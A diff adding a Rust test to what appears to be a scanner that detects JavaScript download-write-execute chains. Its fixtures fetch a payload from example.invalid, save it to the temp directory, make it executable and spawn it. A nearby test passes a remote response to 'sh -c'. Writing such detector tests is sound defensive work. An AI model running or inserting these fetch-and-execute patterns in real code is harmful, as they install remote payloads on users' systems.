@@ -1636,6 +1636,56 @@ fn promise_file_write_then_spawn_is_a_download_chain() {
 }
 
 #[test]
+fn temporary_path_downloads_match_the_same_symbolic_spawn_target() {
+    let root = temporary_directory("temporary-path-write-spawn");
+    fs::write(
+        root.join("positive.js"),
+        br#"const fs = require('fs'); const path = require('path'); const os = require('os'); const cp = require('child_process');
+async function boot() {
+  const response = await fetch('https://example.invalid/payload');
+  const target = path.join(os.tmpdir(), 'payload.bin');
+  await fs.promises.writeFile(target, await response.text());
+  fs.chmodSync(target, 0o755);
+  cp.spawn(target);
+}
+boot();"#,
+    )
+    .unwrap();
+    fs::write(
+        root.join("negative.js"),
+        br#"const fs = require('fs'); const path = require('path'); const os = require('os'); const cp = require('child_process');
+async function boot() {
+  const response = await fetch('https://example.invalid/payload');
+  const target = path.join(os.tmpdir(), 'payload.bin');
+  const other = path.join(os.tmpdir(), 'different.bin');
+  await fs.promises.writeFile(target, await response.text());
+  cp.spawn(other);
+}
+boot();"#,
+    )
+    .unwrap();
+
+    let output = run(&[root.to_str().unwrap(), "--format=json"]);
+
+    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
+    let downloads = report["findings"]
+        .as_array()
+        .unwrap()
+        .iter()
+        .filter(|finding| finding["id"] == "JS-DOWNLOAD-WRITE-EXECUTE")
+        .collect::<Vec<_>>();
+    assert_eq!(downloads.len(), 1, "{}", report["findings"]);
+    assert!(
+        downloads[0]["file"]
+            .as_str()
+            .unwrap()
+            .contains("positive.js")
+    );
+    assert!(downloads[0]["evidence"].to_string().contains("chmod"));
+    fs::remove_dir_all(root).unwrap();
+}
+
+#[test]
 fn remote_response_in_shell_template_reaches_process_sink() {
     let root = temporary_directory("shell-template");
     fs::write(root.join("main.js"), b"const cp = require('child_process'); async function boot() { const response = await fetch('https://example.invalid/control'); cp.exec(`sh -c ${await response.text()}`); } boot();").unwrap();
